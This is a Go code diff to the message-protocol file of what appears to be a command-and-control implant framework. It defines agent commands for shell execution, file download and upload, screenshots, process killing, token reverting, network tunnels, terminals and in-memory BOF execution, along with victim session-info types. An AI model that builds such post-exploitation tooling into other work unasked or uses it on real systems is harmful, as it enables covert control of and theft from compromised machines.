@@ -5,6 +5,9 @@ import (
 	"bytes"
 	"fmt"
 	"io"
+	"regexp"
+	"strconv"
+	"strings"
 
 	"github.com/vmihailenco/msgpack/v5"
 )
@@ -20,48 +23,42 @@ func Unmarshal(data []byte, v interface{}) error {
 }
 
 // ─── Command codes ─────────────────────────────────────────────────────────────
+// Default values (gopher-compatible). A protocol overlay replaces this file.
 
 const (
-	COMMAND_EXIT    = 0
-	COMMAND_UNKNOWN = 1
+	COMMAND_ERROR      = 0
+	COMMAND_PWD        = 1
+	COMMAND_CD         = 2
+	COMMAND_SHELL      = 3
+	COMMAND_EXIT       = 4
+	COMMAND_DOWNLOAD   = 5
+	COMMAND_UPLOAD     = 6
+	COMMAND_CAT        = 7
+	COMMAND_CP         = 8
+	COMMAND_MV         = 9
+	COMMAND_MKDIR      = 10
+	COMMAND_RM         = 11
+	COMMAND_LS         = 12
+	COMMAND_PS         = 13
+	COMMAND_KILL       = 14
+	COMMAND_ZIP        = 15
+	COMMAND_SCREENSHOT = 16
+	COMMAND_RUN        = 17
+	COMMAND_JOB_LIST   = 18
+	COMMAND_JOB_KILL   = 19
+	COMMAND_REV2SELF   = 20
 
-	COMMAND_FS_LIST     = 10
-	COMMAND_FS_UPLOAD   = 11
-	COMMAND_FS_DOWNLOAD = 12
-	COMMAND_FS_REMOVE   = 13
-	COMMAND_FS_MKDIRS   = 14
-	COMMAND_FS_COPY     = 15
-	COMMAND_FS_MOVE     = 16
+	COMMAND_TUNNEL_START  = 31
+	COMMAND_TUNNEL_STOP   = 32
+	COMMAND_TUNNEL_PAUSE  = 33
+	COMMAND_TUNNEL_RESUME = 34
 
-	COMMAND_OS_RUN        = 20
-	COMMAND_OS_INFO       = 21
-	COMMAND_OS_PS         = 22
-	COMMAND_OS_SCREENSHOT = 23
-
-	COMMAND_PROFILE_SLEEP    = 40
-	COMMAND_PROFILE_KILLDATE = 41
-	COMMAND_PROFILE_WORKTIME = 42
+	COMMAND_TERMINAL_START = 35
+	COMMAND_TERMINAL_STOP  = 36
 
 	COMMAND_EXEC_BOF       = 50
 	COMMAND_EXEC_BOF_OUT   = 51
 	COMMAND_EXEC_BOF_ASYNC = 52
-
-	COMMAND_JOB_LIST = 60
-	COMMAND_JOB_KILL = 61
-
-	RESP_COMPLETE      = 0
-	RESP_ERROR         = 1
-	RESP_FS_LIST       = 10
-	RESP_FS_UPLOAD     = 11
-	RESP_FS_DOWNLOAD   = 12
-	RESP_OS_RUN        = 20
-	RESP_OS_INFO       = 21
-	RESP_OS_PS         = 22
-	RESP_OS_SCREENSHOT = 23
-
-	EXFIL_PACK = 100
-	JOB_PACK   = 101
-	BOF_PACK   = 102
 )
 
 // ─── BOF callback & error codes ────────────────────────────────────────────────
@@ -76,12 +73,6 @@ const (
 
 	CALLBACK_AX_SCREENSHOT   = 0x81
 	CALLBACK_AX_DOWNLOAD_MEM = 0x82
-
-	BOF_ERROR_PARSE     = 0x101
-	BOF_ERROR_SYMBOL    = 0x102
-	BOF_ERROR_MAX_FUNCS = 0x103
-	BOF_ERROR_ENTRY     = 0x104
-	BOF_ERROR_ALLOC     = 0x105
 )
 
 // ─── Wire types ────────────────────────────────────────────────────────────────
@@ -96,26 +87,20 @@ type Profile struct {
 	SslCert     []byte   `msgpack:"ssl_cert"`
 	SslKey      []byte   `msgpack:"ssl_key"`
 	CaCert      []byte   `msgpack:"ca_cert"`
-	Sleep       int      `msgpack:"sleep"`
-	Jitter      int      `msgpack:"jitter"`
-	KillDate    int64    `msgpack:"kill_date"`
-	WorkStart   int      `msgpack:"work_start"`
-	WorkEnd     int      `msgpack:"work_end"`
 }
 
 type SessionInfo struct {
-	Hostname    string `msgpack:"hostname"`
-	Username    string `msgpack:"username"`
-	Domain      string `msgpack:"domain"`
-	InternalIP  string `msgpack:"internal_ip"`
-	Os          string `msgpack:"os"`
-	OsVersion   string `msgpack:"os_version"`
-	OsArch      string `msgpack:"os_arch"`
-	Elevated    bool   `msgpack:"elevated"`
-	ProcessId   uint32 `msgpack:"process_id"`
-	ProcessName string `msgpack:"process_name"`
-	CodePage    uint32 `msgpack:"code_page"`
-	Sleep       string `msgpack:"sleep"`
+	Process    string `msgpack:"process"`
+	PID        int    `msgpack:"pid"`
+	User       string `msgpack:"user"`
+	Host       string `msgpack:"host"`
+	Ipaddr     string `msgpack:"ipaddr"`
+	Elevated   bool   `msgpack:"elevated"`
+	Acp        uint32 `msgpack:"acp"`
+	Oem        uint32 `msgpack:"oem"`
+	Os         string `msgpack:"os"`
+	OSVersion  string `msgpack:"os_version"`
+	EncryptKey []byte `msgpack:"encrypt_key"`
 }
 
 type Message struct {
@@ -129,140 +114,196 @@ type Command struct {
 	Data []byte `msgpack:"data"`
 }
 
-// ─── Request param types ───────────────────────────────────────────────────────
-
-type ParamsExit struct{}
-
-type ParamsFsList struct {
-	Path string `msgpack:"path"`
-}
-
-type ParamsFsUpload struct {
-	Path string `msgpack:"path"`
-	Data []byte `msgpack:"data"`
-}
-
-type ParamsFsDownload struct {
-	Path string `msgpack:"path"`
-}
-
-type ParamsFsRemove struct {
-	Path string `msgpack:"path"`
-}
-
-type ParamsFsMkdirs struct {
-	Path string `msgpack:"path"`
-}
-
-type ParamsFsCopy struct {
-	Src string `msgpack:"src"`
-	Dst string `msgpack:"dst"`
-}
-
-type ParamsFsMove struct {
-	Src string `msgpack:"src"`
-	Dst string `msgpack:"dst"`
-}
-
-type ParamsOsRun struct {
-	Command string `msgpack:"command"`
-	Output  bool   `msgpack:"output"`
-	Wait    bool   `msgpack:"wait"`
-}
-
-type ParamsOsInfo struct{}
-
-type ParamsOsPs struct{}
-
-type ParamsOsScreenshot struct{}
-
-type ParamsProfileSleep struct {
-	Sleep  int `msgpack:"sleep"`
-	Jitter int `msgpack:"jitter"`
-}
-
-type ParamsProfileKilldate struct {
-	KillDate int64 `msgpack:"kill_date"`
-}
-
-type ParamsProfileWorktime struct {
-	WorkStart int `msgpack:"work_start"`
-	WorkEnd   int `msgpack:"work_end"`
-}
-
-// ─── Response answer types ─────────────────────────────────────────────────────
-
-type AnsError struct {
-	Message string `msgpack:"message"`
-}
-
-type AnsOsInfo struct {
-	Hostname    string `msgpack:"hostname"`
-	Username    string `msgpack:"username"`
-	Domain      string `msgpack:"domain"`
-	InternalIP  string `msgpack:"internal_ip"`
-	Os          string `msgpack:"os"`
-	OsVersion   string `msgpack:"os_version"`
-	OsArch      string `msgpack:"os_arch"`
-	Elevated    bool   `msgpack:"elevated"`
-	ProcessId   uint32 `msgpack:"process_id"`
-	ProcessName string `msgpack:"process_name"`
-	CodePage    uint32 `msgpack:"code_page"`
-}
-
-type DirEntry struct {
-	Name    string `msgpack:"name"`
-	IsDir   bool   `msgpack:"is_dir"`
-	Size    int64  `msgpack:"size"`
-	ModTime int64  `msgpack:"mod_time"`
-}
-
-type AnsFsList struct {
-	Path    string     `msgpack:"path"`
-	Entries []DirEntry `msgpack:"entries"`
-}
-
-type AnsFsUpload struct {
-	Path string `msgpack:"path"`
-}
-
-type AnsFsDownload struct {
-	Path string `msgpack:"path"`
-	Data []byte `msgpack:"data"`
-}
-
-type AnsOsRun struct {
-	Output string `msgpack:"output"`
-}
-
-type ProcessEntry struct {
-	Pid     uint32 `msgpack:"pid"`
-	PPid    uint32 `msgpack:"ppid"`
-	Name    string `msgpack:"name"`
-	User    string `msgpack:"user"`
-	Arch    string `msgpack:"arch"`
-	Session uint32 `msgpack:"session"`
-}
-
-type AnsOsPs struct {
-	Processes []ProcessEntry `msgpack:"processes"`
-}
-
-type AnsOsScreenshot struct {
-	Image []byte `msgpack:"image"`
-}
-
-type AnsExfil struct {
-	CommandId uint   `msgpack:"command_id"`
-	Data      []byte `msgpack:"data"`
-}
-
-// ─── Job type (async / JOB_PACK) ──────────────────────────────────────────────
-
 type Job struct {
 	CommandId uint   `msgpack:"command_id"`
 	JobId     string `msgpack:"job_id"`
 	Data      []byte `msgpack:"data"`
+}
+
+// ─── Error / answer types ──────────────────────────────────────────────────────
+
+type AnsError struct {
+	Error string `msgpack:"error"`
+}
+
+type AnsPwd struct {
+	Path string `msgpack:"path"`
+}
+
+type ParamsCd struct {
+	Path string `msgpack:"path"`
+}
+
+type ParamsShell struct {
+	Program string   `msgpack:"program"`
+	Args    []string `msgpack:"args"`
+}
+
+type AnsShell struct {
+	Output string `msgpack:"output"`
+}
+
+type ParamsDownload struct {
+	Task string `msgpack:"task"`
+	Path string `msgpack:"path"`
+}
+
+type AnsDownload struct {
+	FileId   int    `msgpack:"id"`
+	Path     string `msgpack:"path"`
+	Size     int    `msgpack:"size"`
+	Content  []byte `msgpack:"content"`
+	Start    bool   `msgpack:"start"`
+	Finish   bool   `msgpack:"finish"`
+	Canceled bool   `msgpack:"canceled"`
+}
+
+type ParamsUpload struct {
+	Path    string `msgpack:"path"`
+	Content []byte `msgpack:"content"`
+	Finish  bool   `msgpack:"finish"`
+}
+
+type AnsUpload struct {
+	Path string `msgpack:"path"`
+}
+
+type ParamsCat struct {
+	Path string `msgpack:"path"`
+}
+
+type AnsCat struct {
+	Path    string `msgpack:"path"`
+	Content []byte `msgpack:"content"`
+}
+
+type ParamsCp struct {
+	Src string `msgpack:"src"`
+	Dst string `msgpack:"dst"`
+}
+
+type ParamsMv struct {
+	Src string `msgpack:"src"`
+	Dst string `msgpack:"dst"`
+}
+
+type ParamsMkdir struct {
+	Path string `msgpack:"path"`
+}
+
+type ParamsRm struct {
+	Path string `msgpack:"path"`
+}
+
+type ParamsLs struct {
+	Path string `msgpack:"path"`
+}
+
+type FileInfo struct {
+	Mode     string `msgpack:"mode"`
+	Nlink    int    `msgpack:"nlink"`
+	User     string `msgpack:"user"`
+	Group    string `msgpack:"group"`
+	Size     int64  `msgpack:"size"`
+	Date     string `msgpack:"date"`
+	Filename string `msgpack:"filename"`
+	IsDir    bool   `msgpack:"is_dir"`
+}
+
+type AnsLs struct {
+	Result bool   `msgpack:"result"`
+	Status string `msgpack:"status"`
+	Path   string `msgpack:"path"`
+	Files  []byte `msgpack:"files"`
+}
+
+type PsInfo struct {
+	Pid     int    `msgpack:"pid"`
+	Ppid    int    `msgpack:"ppid"`
+	Tty     string `msgpack:"tty"`
+	Context string `msgpack:"context"`
+	Process string `msgpack:"process"`
+}
+
+type AnsPs struct {
+	Result    bool   `msgpack:"result"`
+	Status    string `msgpack:"status"`
+	Processes []byte `msgpack:"processes"`
+}
+
+type ParamsKill struct {
+	Pid int `msgpack:"pid"`
+}
+
+type ParamsZip struct {
+	Src string `msgpack:"src"`
+	Dst string `msgpack:"dst"`
+}
+
+type AnsZip struct {
+	Path string `msgpack:"path"`
+}
+
+type AnsScreenshots struct {
+	Screens [][]byte `msgpack:"screens"`
+}
+
+type ParamsRun struct {
+	Program string   `msgpack:"program"`
+	Args    []string `msgpack:"args"`
+	Task    string   `msgpack:"task"`
+}
+
+type AnsRun struct {
+	Stdout string `msgpack:"stdout"`
+	Stderr string `msgpack:"stderr"`
+	Pid    int    `msgpack:"pid"`
+	Start  bool   `msgpack:"start"`
+	Finish bool   `msgpack:"finish"`
+}
+
+type JobInfo struct {
+	JobId   string `msgpack:"job_id"`
+	JobType int    `msgpack:"job_type"`
+}
+
+type AnsJobList struct {
+	List []byte `msgpack:"list"`
+}
+
+type ParamsJobKill struct {
+	Id string `msgpack:"id"`
+}
+
+// ─── Tunnel / terminal types ───────────────────────────────────────────────────
+
+type ParamsTunnelStart struct {
+	Proto     string `msgpack:"proto"`
+	ChannelId int    `msgpack:"channel_id"`
+	Address   string `msgpack:"address"`
+}
+
+type ParamsTunnelStop struct {
+	ChannelId int `msgpack:"channel_id"`
+}
+
+type ParamsTunnelPause struct {
+	ChannelId int `msgpack:"channel_id"`
+}
+
+type ParamsTunnelResume struct {
+	ChannelId int `msgpack:"channel_id"`
+}
+
+type ParamsTerminalStart struct {
+	TermId  int    `msgpack:"term_id"`
+	Program string `msgpack:"program"`
+	Height  int    `msgpack:"height"`
+	Width   int    `msgpack:"width"`
+}
+
+type ParamsTerminalStop struct {
+	TermId int `msgpack:"term_id"`
 }
 
 // ─── BOF types ─────────────────────────────────────────────────────────────────
@@ -288,74 +329,92 @@ type AnsExecBofAsync struct {
 	Finish bool   `msgpack:"finish"`
 }
 
-type ParamsJobKill struct {
-	Id string `msgpack:"id"`
-}
-
-type JobInfo struct {
-	JobId   string `msgpack:"job_id"`
-	JobType int    `msgpack:"job_type"`
-}
-
-type AnsJobList struct {
-	List []byte `msgpack:"list"`
-}
-
 // ─── Helpers ───────────────────────────────────────────────────────────────────
 
-func ZipBytes(data []byte) ([]byte, error) {
+func parseDurationToSeconds(input string) (int, error) {
+	re := regexp.MustCompile(`(\d+)(h|m|s)`)
+	matches := re.FindAllStringSubmatch(input, -1)
+	if matches == nil {
+		input = input + "s"
+		matches = re.FindAllStringSubmatch(input, -1)
+	}
+	totalSeconds := 0
+	for _, match := range matches {
+		value, err := strconv.Atoi(match[1])
+		if err != nil {
+			return 0, err
+		}
+		switch match[2] {
+		case "h":
+			totalSeconds += value * 3600
+		case "m":
+			totalSeconds += value * 60
+		case "s":
+			totalSeconds += value
+		}
+	}
+	return totalSeconds, nil
+}
+
+func ZipBytes(data []byte, name string) ([]byte, error) {
 	var buf bytes.Buffer
-	w := zip.NewWriter(&buf)
-	f, err := w.Create("data")
+	zipWriter := zip.NewWriter(&buf)
+	writer, err := zipWriter.Create(name)
 	if err != nil {
 		return nil, err
 	}
-	if _, err = f.Write(data); err != nil {
+	_, err = writer.Write(data)
+	if err != nil {
 		return nil, err
 	}
-	if err = w.Close(); err != nil {
+	err = zipWriter.Close()
+	if err != nil {
 		return nil, err
 	}
 	return buf.Bytes(), nil
 }
 
-func UnzipBytes(data []byte) ([]byte, error) {
-	r, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
+func UnzipBytes(zipData []byte) (map[string][]byte, error) {
+	result := make(map[string][]byte)
+	reader := bytes.NewReader(zipData)
+	zipReader, err := zip.NewReader(reader, int64(len(zipData)))
 	if err != nil {
 		return nil, err
 	}
-	if len(r.File) == 0 {
-		return nil, fmt.Errorf("empty zip")
+	for _, file := range zipReader.File {
+		rc, err := file.Open()
+		if err != nil {
+			return nil, err
+		}
+		var buf bytes.Buffer
+		_, err = io.Copy(&buf, rc)
+		rc.Close()
+		if err != nil {
+			return nil, err
+		}
+		result[file.Name] = buf.Bytes()
 	}
-	rc, err := r.File[0].Open()
-	if err != nil {
-		return nil, err
-	}
-	defer rc.Close()
-	return io.ReadAll(rc)
-}
-
-func SizeBytesToFormat(size int64) string {
-	const (
-		KB = 1024
-		MB = KB * 1024
-		GB = MB * 1024
-	)
-	switch {
-	case size >= GB:
-		return fmt.Sprintf("%.2f GB", float64(size)/GB)
-	case size >= MB:
-		return fmt.Sprintf("%.2f MB", float64(size)/MB)
-	case size >= KB:
-		return fmt.Sprintf("%.2f KB", float64(size)/KB)
-	default:
-		return fmt.Sprintf("%d B", size)
-	}
+	return result, nil
 }
 
 func ensureNewline(s string) string {
-	if len(s) > 0 && s[len(s)-1] != '\n' {
-		return s + "\n"
+	if s == "" || strings.HasSuffix(s, "\n") {
+		return s
 	}
-	return s
+	return s + "\n"
+}
+
+func SizeBytesToFormat(bytes int64) string {
+	const (
+		KB = 1024.0
+		MB = KB * 1024
+		GB = MB * 1024
+	)
+	size := float64(bytes)
+	if size >= GB {
+		return fmt.Sprintf("%.2f Gb", size/GB)
+	} else if size >= MB {
+		return fmt.Sprintf("%.2f Mb", size/MB)
+	}
+	return fmt.Sprintf("%.2f Kb", size/KB)
 }
